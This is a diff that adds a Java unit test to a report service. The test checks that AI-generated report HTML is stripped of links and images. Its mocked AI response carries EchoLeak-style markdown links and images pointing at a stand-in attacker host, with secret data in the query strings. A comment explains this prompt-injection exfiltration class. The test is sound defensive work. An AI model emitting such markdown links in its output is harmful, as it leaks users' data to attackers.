@@ -147,4 +147,19 @@ class RaporServiceTest {
         assertThat(tempDir.resolve("raporlar/hafta-02.md")).doesNotExist();
         assertThat(KisiselDizin.coz(tempDir.resolve("raporlar"), "a@pera.software").resolve("hafta-01.md")).exists();
     }
+
+    @Test
+    void raporHtmlindeBaglantiVeGorselYokMetinKalir() {
+        // EchoLeak sınıfı (llm-uygulama-guvenligi.md §4d): AI çıktısına sızmış bağlantı/görsel tek tıkla
+        // (veya CSP gevşerse tıklamasız) veri dışarı taşır → rapor HTML'inde <a>/<img> HİÇ olmamalı, metin kalmalı
+        when(aiClient.cagir(any())).thenReturn(new AiYanit(
+                "# Rapor\n[detaylar](https://saldirgan.example/?q=GIZLI) ve "
+                        + "![iz](https://saldirgan.example/p.png?d=GIZLI) <https://saldirgan.example/oto>",
+                100, 200, "m"));
+
+        String html = servis.rapor(1, true).html();
+
+        assertThat(html).doesNotContain("<a").doesNotContain("<img").doesNotContain("saldirgan.example/?q");
+        assertThat(html).contains("detaylar");                 // bağlantı METNİ korunur
+    }
 }
